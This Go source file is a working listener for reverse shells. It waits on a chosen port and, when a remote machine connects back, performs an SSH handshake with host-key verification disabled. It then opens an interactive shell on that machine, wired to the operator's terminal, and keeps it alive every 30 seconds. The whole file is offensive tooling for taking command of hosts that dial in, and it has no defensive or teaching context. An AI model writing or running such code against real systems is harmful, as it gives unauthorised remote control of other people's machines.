package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	// setup
	port := os.Args[1]

	socket, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		panic(err)
	}
	fmt.Println("[+] Listening on 0.0.0.0:" + port)
	for {
		conn, err := socket.Accept()
		if err != nil {
			fmt.Println("[!] Accept error:", err)
			continue
		}
		fmt.Println("[+] Accepted connection from ", conn.RemoteAddr())

		// Make this a gofunc if you want to handle multiple clients.
		// Since stdin/stdout/stderr are tied to the connection
		// Would need to add a "select connection to interact with" ability
		HandleClient(conn)
		fmt.Println("\n\n[*] Connection terminated: ", conn.RemoteAddr())
	}
}

func HandleClient(conn net.Conn) {
	defer conn.Close()
	sshConfig := &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	_client_initial_conn, channels, requests, err := ssh.NewClientConn(conn, conn.RemoteAddr().String(), sshConfig)
	if err != nil {
		fmt.Println("[!] Handshake failed:", err)
		conn.Close()
		return
	}
	fmt.Println("[+] Received connection from ", conn.RemoteAddr())

	go ssh.DiscardRequests(requests)
	client := ssh.NewClient(_client_initial_conn, channels, requests)
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		fmt.Printf("[!] Session error: %s\nError: %s\n", client.RemoteAddr(), err)
		conn.Close()
		return
	}
	// keepalive every X seconds
	go keepAlive(client, 30)
	handleSession(session)
}

func handleSession(session *ssh.Session) {
	defer session.Close()
	session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	session.Stdin = os.Stdin
	err := session.Shell()
	if err != nil {
		fmt.Println("[!] Shell error:", err)
		return
	}
	session.Wait()
}

// keepalive every 30 seconds
func keepAlive(conn *ssh.Client, delay time.Duration) {
	for {
		_, _, err := conn.SendRequest("pingpong", true, nil)
		if err != nil {
			fmt.Println("[!] Keepalive failed:", err)
			return
		}
		time.Sleep(delay * time.Second)
	}
}
